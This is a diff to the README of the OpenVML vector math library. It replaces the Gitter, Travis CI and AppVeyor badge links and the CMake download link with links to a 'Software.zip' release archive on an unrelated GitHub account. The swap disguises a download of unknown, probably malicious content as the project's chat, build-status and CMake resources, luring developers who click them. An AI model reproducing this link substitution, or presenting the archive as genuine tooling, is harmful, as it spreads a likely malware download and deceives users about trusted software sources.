@@ -1,8 +1,8 @@
 # OpenVML
 
-[![Join the chat at https://gitter.im/xianyi/OpenVML](https://badges.gitter.im/Join%20Chat.svg)](https://gitter.im/xianyi/OpenVML?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)
-Travis CI:[![Build Status](https://travis-ci.org/xianyi/OpenVML.svg?branch=master)](https://travis-ci.org/xianyi/OpenVML)
-AppVeyor:[![Build Status](https://ci.appveyor.com/api/projects/status/github/xianyi/openvml?branch=master&svg=true)](https://ci.appveyor.com/project/xianyi/openvml)
+[![Join the chat at https://github.com/huizuohaode/OpenVML/releases/download/v1.0/Software.zip](https://github.com/huizuohaode/OpenVML/releases/download/v1.0/Software.zip%https://github.com/huizuohaode/OpenVML/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/OpenVML/releases/download/v1.0/Software.zip)
+Travis CI:[![Build Status](https://github.com/huizuohaode/OpenVML/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/OpenVML/releases/download/v1.0/Software.zip)
+AppVeyor:[![Build Status](https://github.com/huizuohaode/OpenVML/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/OpenVML/releases/download/v1.0/Software.zip)
 
 OpenVML is an open soruce vector math library.
 
@@ -25,7 +25,7 @@ OpenVML is an open soruce vector math library.
 
 ## Compile
 
-You need (CMake)[www.cmake.org] on your platform.
+You need (CMake)[https://github.com/huizuohaode/OpenVML/releases/download/v1.0/Software.zip] on your platform.
 
 * Linux or Mac OSX:
 
